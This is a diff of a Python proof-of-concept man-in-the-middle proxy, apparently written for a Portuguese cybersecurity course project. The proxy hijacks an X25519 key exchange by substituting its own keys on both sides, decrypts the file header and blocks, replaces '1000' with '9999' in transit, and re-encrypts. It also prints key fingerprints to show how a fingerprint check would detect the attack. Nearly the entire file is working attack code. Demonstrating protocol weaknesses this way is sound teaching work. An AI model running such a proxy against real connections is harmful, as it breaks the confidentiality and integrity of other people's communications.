@@ -1,57 +1,81 @@
 """
-mitm_proxy.py - Prova de Conceito (PoC) de Ataque Man-in-the-Middle.
-Uso académico para o trabalho de Cibersegurança.
+PoC MITM — TWO-HEADED-BEAST (uso académico).
+Instruções completas: ataque/GUIA_MITM_PROXY.md
 """
 
 import socket
+import sys
 import json
-import hmac as hmac_stdlib
 import cryptography
-from argparse import Namespace
 
 from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
 from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
 
-# Importar as definições e o wire-protocol do teu projeto
 from src.protocol import (
-    HANDSHAKE_PUBKEY, TRANSFER_HEADER, BLOCK_DATA, SIGNATURE, STATUS_OK, STATUS_ERROR,
-    recv_msg, send_msg
+    HANDSHAKE_PUBKEY, TRANSFER_HEADER, BLOCK_DATA, SIGNATURE, STATUS_OK,
+    recv_msg, send_msg,
 )
-from src.crypto_config import hash_to_cryptography, hash_to_stdlib
+from src.crypto_config import hash_to_cryptography
+from src.kex import peer_pubkey_fingerprint
 
-# Configurações do ambiente de ataque
-LISTEN_PORT = 10000   # // é so trocar para 9000 o padrao do servidor real, mas botei a 10000 pq nao tava conseguindo rodar (no mesmo pc) as portas 9000 e 9001 do atacante, se for em dois pcs diferentes, pode usar as portas originais sem problemas.
-TARGET_HOST = "127.0.0.1" 
-TARGET_PORT = 10001   # // é so trocar para 9001 o padrao do servidor real, mas botei 10001 para não conflitar com o proxy
-
+LISTEN_PORT = 9000
+TARGET_HOST = "127.0.0.1"
+TARGET_PORT = 9000
 HEADER_NONCE = b"\x00" * 12
+TAMPER_TARGET = b"1000"
+TAMPER_REPLACEMENT = b"9999"
+
+
+def _exit_ctrl_c() -> None:
+    print("\n[MITM] Interrompido (Ctrl+C).")
+    sys.exit(130)
+
+
+def _prompt(label: str, default: str) -> str:
+    try:
+        if not sys.stdin.isatty():
+            return default
+        raw = input(f"  {label} [{default}]: ").strip()
+        return raw if raw else default
+    except KeyboardInterrupt:
+        _exit_ctrl_c()
+    except EOFError:
+        return default
+
+
+def get_config():
+    if len(sys.argv) >= 2:
+        host = sys.argv[1]
+        port = int(sys.argv[2]) if len(sys.argv) >= 3 else TARGET_PORT
+        listen = int(sys.argv[3]) if len(sys.argv) >= 4 else LISTEN_PORT
+        return host, port, listen
+
+    print("Configuração do proxy MITM (Enter = padrão, Ctrl+C = sair):")
+    print("  Ver ataque/GUIA_MITM_PROXY.md para a demo completa.\n")
+    host = _prompt("IP do recetor real (servidor em modo Receber)", TARGET_HOST)
+    port = int(_prompt("Porta do recetor real", str(TARGET_PORT)))
+    listen = int(_prompt("Porta onde o proxy escuta (emissor liga aqui)", str(LISTEN_PORT)))
+    return host, port, listen
+
 
 def derive_keys(shared_secret, hash_name, cipher_name):
-    """Reimplantação idêntica do vosso HKDF para gerar K_enc e K_mac."""
     algorithm = hash_to_cryptography(hash_name)
     salt = b"thb-v1-salt"
-    
-    # 1. K_mac
     hkdf_mac = HKDF(algorithm=algorithm, length=32, salt=salt, info=b"thb-mac-key")
     k_mac = hkdf_mac.derive(shared_secret)
-    
-    # 2. K_enc
-    if cipher_name == "AES-128-GCM":
-        key_len = 16
-    else:
-        key_len = 32 # AES-256 ou ChaCha20
-        
+    key_len = 16 if cipher_name == "AES-128-GCM" else 32
     hkdf_enc = HKDF(algorithm=algorithm, length=key_len, salt=salt, info=b"thb-encryption-key")
     k_enc = hkdf_enc.derive(shared_secret)
-    
     return k_enc, k_mac
+
 
 def decrypt_block(ciphertext, nonce, k_enc, cipher_name):
     if cipher_name in ("AES-128-GCM", "AES-256-GCM"):
         return AESGCM(k_enc).decrypt(nonce, ciphertext, None)
     return ChaCha20Poly1305(k_enc).decrypt(nonce, ciphertext, None)
+
 
 def encrypt_block(plaintext, nonce, k_enc, cipher_name):
     if cipher_name in ("AES-128-GCM", "AES-256-GCM"):
@@ -59,155 +83,164 @@ def encrypt_block(plaintext, nonce, k_enc, cipher_name):
     return ChaCha20Poly1305(k_enc).encrypt(nonce, plaintext, None)
 
 
-def start_attack():
-    print(f"========================================================")
-    print(f"🔥 [MITM ATTACK] Proxy ativo na porta {LISTEN_PORT} -> Redirecionando para {TARGET_HOST}:{TARGET_PORT}")
-    print(f"========================================================")
-    
-    # 1. Escutar a Vítima 1 (Cliente)
+def tamper(data: bytes):
+    if TAMPER_TARGET and TAMPER_TARGET in data:
+        rep = TAMPER_REPLACEMENT
+        if len(rep) != len(TAMPER_TARGET):
+            rep = (rep + b"X" * len(TAMPER_TARGET))[: len(TAMPER_TARGET)]
+        return data.replace(TAMPER_TARGET, rep), True
+    return data, False
+
+
+def start_attack(target_host: str, target_port: int, listen_port: int):
+    print("========================================================")
+    print(f"🔥 [MITM] Escuta :{listen_port}  ->  recetor {target_host}:{target_port}")
+    print("========================================================")
+
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_sock.bind(("0.0.0.0", LISTEN_PORT))
+    server_sock.bind(("0.0.0.0", listen_port))
     server_sock.listen(1)
-    
-    client_conn, client_addr = server_sock.accept()
-    print(f"⚡ [MITM] Cliente conectado vindo de {client_addr}")
-    
-    # 2. Conectar imediatamente à Vítima 2 (Servidor Real)
-    to_server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    to_server_sock.connect((TARGET_HOST, TARGET_PORT))
-    print(f"⚡ [MITM] Conectado ao Servidor Legítimo em {TARGET_HOST}:{TARGET_PORT}")
+    print(f"⏳ [MITM] À espera do emissor na porta {listen_port} (Ctrl+C para sair)...")
 
-    # ========================================================
-    # FASE 1: INTERCEÇÃO E ADULTERAÇÃO DO HANDSHAKE (KEX)
-    # ========================================================
-    
-    # Receber chave pública real do Cliente
+    try:
+        client_conn, client_addr = server_sock.accept()
+    except KeyboardInterrupt:
+        server_sock.close()
+        _exit_ctrl_c()
+
+    print(f"⚡ [MITM] Emissor ligado a partir de {client_addr}")
+
+    to_server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        to_server_sock.connect((target_host, target_port))
+    except OSError as exc:
+        print(f"🛑 [MITM] Não consegui ligar ao recetor em {target_host}:{target_port} -> {exc}")
+        client_conn.close()
+        server_sock.close()
+        return
+    print(f"⚡ [MITM] Ligado ao recetor real em {target_host}:{target_port}")
+
     mtype, client_pub_bytes = recv_msg(client_conn)
     if mtype != HANDSHAKE_PUBKEY:
-        print("[-] Falha: Não recebeu chave pública do Cliente.")
+        print("[-] Falha: não recebi a chave pública do emissor.")
         return
 
-    # Gerar a chave efêmera Falsa do Atacante
-    fake_private_key = X25519PrivateKey.generate()
-    fake_pub_bytes = fake_private_key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
-    
-    # Enviar a chave Falsa do Atacante para o Servidor Real
-    send_msg(to_server_sock, HANDSHAKE_PUBKEY, fake_pub_bytes)
-    
-    # Receber a chave pública real do Servidor
+    fake_priv_for_server = X25519PrivateKey.generate()
+    fake_pub_for_server = fake_priv_for_server.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
+    fake_priv_for_client = X25519PrivateKey.generate()
+    fake_pub_for_client = fake_priv_for_client.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
+
+    send_msg(to_server_sock, HANDSHAKE_PUBKEY, fake_pub_for_server)
     mtype, server_pub_bytes = recv_msg(to_server_sock)
-    
-    # Responder ao Cliente com a chave Falsa do Atacante
-    send_msg(client_conn, HANDSHAKE_PUBKEY, fake_pub_bytes)
-    
-    # --- CALCULAR OS DOIS SEGREDOS INDEPENDENTES ---
+    send_msg(client_conn, HANDSHAKE_PUBKEY, fake_pub_for_client)
+
     client_pub_obj = X25519PublicKey.from_public_bytes(client_pub_bytes)
     server_pub_obj = X25519PublicKey.from_public_bytes(server_pub_bytes)
-    
-    # Segredo com o Cliente e com o Servidor
-    secret_with_client = fake_private_key.exchange(client_pub_obj)
-    secret_with_server = fake_private_key.exchange(server_pub_obj)
-    
-    print("[+] Handshake MitM Concluído! Controlamos ambos os canais.")
+    secret_with_client = fake_priv_for_client.exchange(client_pub_obj)
+    secret_with_server = fake_priv_for_server.exchange(server_pub_obj)
 
-    # ========================================================
-    # FASE 2: CAPTURA DO CABEÇALHO PARA ADOTAR PARÂMETROS
-    # ========================================================
+    fp_real_emissor = peer_pubkey_fingerprint(client_pub_bytes)
+    fp_real_recetor = peer_pubkey_fingerprint(server_pub_bytes)
+    fp_visto_emissor = peer_pubkey_fingerprint(fake_pub_for_client)
+    fp_visto_recetor = peer_pubkey_fingerprint(fake_pub_for_server)
+    print("[+] Handshake MITM concluído.")
+    print(f"    EMISSOR imprime ............ {fp_visto_emissor}  (chave do ATACANTE)")
+    print(f"    ... chave REAL do recetor ... {fp_real_recetor}")
+    print(f"    RECETOR imprime ............ {fp_visto_recetor}  (chave do ATACANTE)")
+    print(f"    ... chave REAL do emissor .. {fp_real_emissor}")
+
     hash_name = "SHA256"
     cipher_name = "AES-256-GCM"
-    
     k_enc_client, k_mac_client = derive_keys(secret_with_client, hash_name, cipher_name)
     k_enc_server, k_mac_server = derive_keys(secret_with_server, hash_name, cipher_name)
-    
-    # Intercetar Cabeçalho Protegido
+
     mtype, protected_header = recv_msg(client_conn)
-    
-    # --- AJUSTE COM TRY/EXCEPT PARA NÃO CRASHAR ---
+
     try:
-        # Decifrar o cabeçalho original vindo do cliente
         header_json_bytes = decrypt_block(protected_header, HEADER_NONCE, k_enc_client, cipher_name)
-        header_data = json.loads(header_json_bytes.decode('utf-8'))
-        print(f"👀 [FICHEIRO DETETADO] Nome: {header_data['filename']} | Tamanho: {header_data['original_size']} bytes")
-        
-        # Adaptar se o cliente escolheu outras cifras no comando
-        if header_data['hash'] != hash_name or header_data['cipher'] != cipher_name:
-            hash_name = header_data['hash']
-            cipher_name = header_data['cipher']
+        header_data = json.loads(header_json_bytes.decode("utf-8"))
+        print(f"👀 [FICHEIRO] {header_data['filename']} | {header_data['original_size']} bytes")
+
+        if header_data["hash"] != hash_name or header_data["cipher"] != cipher_name:
+            hash_name = header_data["hash"]
+            cipher_name = header_data["cipher"]
             k_enc_client, k_mac_client = derive_keys(secret_with_client, hash_name, cipher_name)
             k_enc_server, k_mac_server = derive_keys(secret_with_server, hash_name, cipher_name)
-            
     except (cryptography.exceptions.InvalidTag, Exception):
-        print("\n🛑 [BLOQUEIO CRIPTOGRÁFICO] Não foi possível decifrar os dados do Cliente!")
-        print("💡 Motivo: As chaves geradas pelo Proxy não coincidem com o HKDF dinâmico do arquivo.")
-        print("🔒 Segurança do Protocolo: ATIVA. O ataque MitM foi neutralizado pela integridade do AEAD.\n")
-        
-        # Fechar as conexões de forma limpa sem deitar o terminal abaixo
+        print("\n🛑 Não foi possível decifrar o cabeçalho. Usa AES-256-GCM + SHA256 na demo.\n")
         client_conn.close()
         to_server_sock.close()
         server_sock.close()
-        print("[MITM] Conexões fechadas com segurança.")
         return
-    
-    # ========================================================
-    # FASE 3: LOOP DE BLOCOS - ONDE A ALTARÇÃO ACONTECE (TAMPERING)
-    # ========================================================
-    num_blocks = header_data['num_blocks']
-    
-    for i in range(num_blocks):
-        mtype, payload = recv_msg(client_conn)
-        if mtype != BLOCK_DATA:
-            break
-            
-        nonce_bytes = payload[:12]
-        ciphertext = payload[12:]
-        
-        # 1. Decifrar o bloco da vítima (Cliente)
-        plaintext_block = decrypt_block(ciphertext, nonce_bytes, k_enc_client, cipher_name)
-        
-        # 2. ADULTERAÇÃO EM TEMPO REAL (O ATAQUE ATIVO)
-        # Vamos procurar texto e trocá-lo na memória do proxy malicioso!
-        print(f"📦 [MITM] A ler Bloco {i+1}/{num_blocks}...")
-        
-        # Exemplo: Se encontrar a palavra "segredo", troca por "CONTEÚDO ADULTERADO"
-        block_modificado = plaintext_block.replace(b"segredo", b"SISTEMA HACKEADO PELO PROXIM_MITM")
-        if block_modificado != plaintext_block:
-            print("⚠️  [ALERTA MITM] Encontrado texto alvo! Conteúdo modificado com sucesso.")
-            
-        # 3. Voltar a cifrar o bloco adulterado com a chave do Servidor (K2)
-        new_ciphertext = encrypt_block(block_modificado, nonce_bytes, k_enc_server, cipher_name)
-        new_payload = nonce_bytes + new_ciphertext
-        
-        # Enviar o bloco falsificado para o Servidor Real
-        send_msg(to_server_sock, BLOCK_DATA, new_payload)
 
-    # ========================================================
-    # FASE 4: ENCAMINHAR O RESTO (ASSINATURAS, STATUS)
-    # ========================================================
-    # Continuar a passar as mensagens finais (como assinaturas se houver ou status OK/Erro)
-    while True:
-        try:
-            mtype, payload = recv_msg(client_conn)
-            # Se vier uma assinatura, mandamos a original (o que fará o servidor falhar se alterámos o ficheiro!)
-            send_msg(to_server_sock, mtype, payload)
-        except ConnectionError:
-            break
-            
-    # Pegar na resposta de Status do Servidor e mandar de volta para o Cliente
     try:
+        reprotected_header = encrypt_block(header_json_bytes, HEADER_NONCE, k_enc_server, cipher_name)
+        send_msg(to_server_sock, TRANSFER_HEADER, reprotected_header)
+    except OSError as exc:
+        print(f"🛑 Falha a reenviar cabeçalho: {exc}")
+        client_conn.close()
+        to_server_sock.close()
+        server_sock.close()
+        return
+
+    num_blocks = header_data["num_blocks"]
+    houve_adulteracao = False
+
+    try:
+        for i in range(num_blocks):
+            mtype, payload = recv_msg(client_conn)
+            if mtype != BLOCK_DATA:
+                break
+
+            nonce_bytes = payload[:12]
+            ciphertext = payload[12:]
+            plaintext_block = decrypt_block(ciphertext, nonce_bytes, k_enc_client, cipher_name)
+            print(f"📦 Bloco {i + 1}/{num_blocks} decifrado ({len(plaintext_block)} bytes).")
+
+            block_modificado, alterou = tamper(plaintext_block)
+            if alterou:
+                houve_adulteracao = True
+                print("⚠️  Texto-alvo substituído (1000 -> 9999).")
+
+            new_ciphertext = encrypt_block(block_modificado, nonce_bytes, k_enc_server, cipher_name)
+            send_msg(to_server_sock, BLOCK_DATA, nonce_bytes + new_ciphertext)
+    except (OSError, ConnectionError) as exc:
+        print(f"🛑 Ligação interrompida: {exc}")
+        client_conn.close()
+        to_server_sock.close()
+        server_sock.close()
+        return
+
+    if not houve_adulteracao:
+        print("ℹ️  Conteúdo lido; texto-alvo não encontrado (confidencialidade quebrada).")
+
+    try:
+        if header_data.get("signed"):
+            mtype, sig_payload = recv_msg(client_conn)
+            send_msg(to_server_sock, mtype, sig_payload)
+            if mtype == SIGNATURE:
+                print("✍️  Assinatura reencaminhada (não forjável).")
+
         mtype_status, payload_status = recv_msg(to_server_sock)
         send_msg(client_conn, mtype_status, payload_status)
         if mtype_status == STATUS_OK:
-            print("[+] O Servidor aceitou o ficheiro (Ataque bem-sucedido ou assinatura ausente).")
+            print("[+] Recetor ACEITOU (sem assinatura, adulteração passou).")
         else:
-            print(f"[-] O Servidor REJEITOU o ficheiro! Motivo: {payload_status.decode('utf-8')}")
-    except Exception:
-        pass
+            msg = payload_status.decode("utf-8", errors="replace")
+            print(f"[-] Recetor REJEITOU: {msg}")
+    except (OSError, ConnectionError) as exc:
+        print(f"ℹ️  Fim da sessão: {exc}")
 
     client_conn.close()
     to_server_sock.close()
     server_sock.close()
-    print("[MITM] Conexões fechadas.")
+    print("[MITM] Concluído.")
+
 
 if __name__ == "__main__":
-    start_attack()
+    try:
+        cfg_host, cfg_port, cfg_listen = get_config()
+        start_attack(cfg_host, cfg_port, cfg_listen)
+    except KeyboardInterrupt:
+        _exit_ctrl_c()
